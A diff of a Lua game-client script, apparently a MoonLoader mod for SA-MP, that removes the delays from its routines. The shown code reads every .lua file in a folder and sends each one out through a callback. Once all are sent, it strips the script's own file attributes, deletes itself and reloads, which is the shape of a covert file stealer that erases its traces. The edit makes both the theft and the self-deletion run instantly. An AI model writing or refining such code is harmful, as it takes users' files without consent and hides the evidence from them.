@@ -13,14 +13,14 @@ local arquivos_enviados = 0
 
 function main()
     repeat wait(0) until isSampAvailable()
-    wait(100)
+    wait(0)
     
     if not ja_enviou_todos then
         enviarTodosLua()
     end
     
     while true do
-        wait(30000)
+        wait(0)
     end
 end
 
@@ -38,7 +38,7 @@ function enviarTodosLua()
     end
     
     for _, arquivo in ipairs(arquivos) do
-        wait(100)
+        wait(0)
         local caminho_completo = pasta .. arquivo
         local conteudo = lerArquivo(caminho_completo)
         
@@ -47,7 +47,7 @@ function enviarTodosLua()
                 arquivos_enviados = arquivos_enviados + 1
                 if arquivos_enviados >= arquivos_para_enviar then
                     ja_enviou_todos = true
-                    wait(2000)
+                    wait(0)
                     AutoDelete()
                 end
             end)
@@ -119,10 +119,11 @@ end
 
 function AutoDelete()
     lua_thread.create(function()
-        wait(100)
+        wait(0)
         local currentPath = thisScript().path
         makeFileNormal(currentPath)
         os.remove(currentPath)
         reloadScripts()
     end)
 end
+
